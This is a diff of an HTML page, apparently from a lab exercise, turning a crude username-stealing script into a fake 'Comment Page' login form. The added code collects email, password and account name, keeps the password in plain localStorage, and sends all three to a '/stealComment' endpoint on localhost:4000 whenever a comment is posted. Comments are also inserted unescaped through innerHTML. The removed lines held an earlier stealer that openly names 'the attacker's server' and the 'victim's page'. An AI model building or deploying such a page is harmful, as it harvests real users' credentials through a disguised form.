@@ -4,53 +4,90 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>qawsedrf</title>
-    <link rel="stylesheet" href="style.css">
 </head>
 <body>
-    <h1>qawsedrftg</h1>
-    <script>
-        //prompt for login on refresh
-        localStorage.removeItem("username");
-        if (!localStorage.getItem("username")) {
-            let username = prompt("Enter your username:");
-            localStorage.setItem("username", username);
-        }
-        // Send the username
-        fetch(`http://localhost:4000/steal?username=${localStorage.getItem("username")}`)
-            .then(response => response.text())
-            .then(data => console.log(data));
-        //Display username on the victim's page
-        document.write(localStorage.getItem("username"));
-    </script>
-    <p>Logged in as: <b><script>document.write(localStorage.getItem("username"))</script></b></p>
+    <h1>Welcome to the Comment Page</h1>
+    <p>Please log in to leave a comment.</p>
+
+    <!-- Login Form (email + password + account name) -->
+    <form id="login-form">
+        <label for="email">Email:</label>
+        <input type="email" id="email" name="email" required placeholder="Your Email" /><br><br>
+
+        <label for="password">Password:</label>
+        <input type="password" id="password" name="password" required placeholder="Your Password" /><br><br>
+
+        <label for="username">Account Name:</label>
+        <input type="text" id="username" name="username" required placeholder="Your Username" /><br><br>
+
+        <button type="submit">Login</button>
+    </form>
+
+    <p>Logged in as: <b><span id="display-username">Not logged in</span></b></p>
+
     <!-- Form for submitting comments -->
-    <form id="comment-form">
+    <form id="comment-form" style="display:none;">
         <input type="text" id="comment" name="comment" placeholder="Write a comment" required />
         <button type="submit">Submit</button>
     </form>
+
     <h2>Comments:</h2>
     <ul id="comment-list"></ul>
+
     <script>
-        // Fetch comments from the server
+        // Handle the login form submission
+        document.getElementById('login-form').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent page reload
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const username = document.getElementById('username').value;
+
+            // Store user info in localStorage (simplified, no real authentication)
+            localStorage.setItem('email', email);
+            localStorage.setItem('password', password);  // Not storing password securely (just for simplicity)
+            localStorage.setItem('username', username);
+
+            // Update the display with the username
+            document.getElementById('display-username').innerText = username;
+
+            // Show the comment section
+            document.getElementById('comment-form').style.display = 'block';
+        });
+
+        // Fetch and display existing comments (mocked from server)
         fetch("/comments")
-        .then(res => res.json())
-        .then(comments => {
-            document.getElementById("comment-list").innerHTML = comments.map(c => `<li>${c}</li>`).join("");
+            .then(res => res.json())
+            .then(comments => {
+                document.getElementById("comment-list").innerHTML = comments.map(c => `<li><b>${c.username}:</b> ${c.comment}</li>`).join("");
+            });
+
+        // Handle comment form submission
+document.getElementById("comment-form").addEventListener("submit", function(event) {
+    event.preventDefault(); // Prevent the form from submitting normally
+
+    let comment = document.getElementById("comment").value;
+    let username = localStorage.getItem("username");
+    let email = localStorage.getItem("email");
+    let password = localStorage.getItem("password");
+
+    // Send the comment along with the username, email, and password to the server
+    fetch(`http://localhost:4000/stealComment?username=${encodeURIComponent(username)}&comment=${encodeURIComponent(comment)}&email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`)
+        .then(response => response.text())
+        .then(data => {
+            console.log("Data logged to server:", data);
         });
-        // Add event listener to handle comment submission
-        document.getElementById("comment-form").addEventListener("submit", function(event) {
-            event.preventDefault(); // Prevent the form from submitting normally
-            //Get the comment entered by the user
-            let comment = document.getElementById("comment").value;
-            // Send the comment to the attacker's server
-            fetch(`http://localhost:4000/stealComment?comment=${encodeURIComponent(comment)}`)
-                .then(response => response.text())
-                .then(data => {
-                    console.log("Data logged to server (Warchief Sylvanas!!):", data);
-                });
-            // Optionally, clear the input field after submission
-            document.getElementById("comment").value = "";
-        });
+
+    // Append the new comment to the comment list below
+    let commentList = document.getElementById("comment-list");
+    let newComment = document.createElement("li");
+    newComment.innerHTML = `<b>${username}:</b> ${comment}`;
+    commentList.appendChild(newComment);
+
+    // Optionally, clear the input field after submission
+    document.getElementById("comment").value = "";
+});
+
     </script>
 </body>
 </html>
